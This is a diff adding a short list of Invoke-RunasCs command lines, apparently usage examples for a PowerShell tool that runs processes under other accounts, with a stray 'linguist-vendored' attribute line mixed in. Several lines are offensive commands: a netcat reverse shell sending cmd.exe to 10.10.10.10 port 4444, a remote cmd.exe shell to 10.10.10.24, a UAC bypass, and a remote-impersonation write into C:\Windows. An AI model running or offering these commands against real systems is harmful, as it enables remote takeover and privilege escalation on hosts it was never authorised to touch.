@@ -1,0 +1,9 @@
+"Invoke-RunasCs -Domain domain1 -Username user1 -Password password1 -Command ""cmd /c whoami /all"" -LogonType 8"
+"Invoke-RunasCs -Username adm1 -Password password1 ""cmd /c echo admin > C:\Windows\admin"" -LogonType 8 -RemoteImpersonation"
+"Invoke-RunasCs -Username adm1 -Password password1 ""cmd /c whoami /priv"" -BypassUac"
+"Invoke-RunasCs -Username user1 -Password password1 -Command ""cmd /c whoami /all"" -LogonType 9"
+"Invoke-RunasCs -Username user1 -Password password1 -ProcessTimeout 0 -Command ""C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe"""
+"Invoke-RunasCs user1 password1 ""cmd /c whoami /all"""
+Invoke-RunasCs
+Invoke-RunasCs -Username user1 -Password password1 -Command cmd.exe -Remote 10.10.10.24:4444
+Invoke-RunasCs.ps1 linguist-vendored
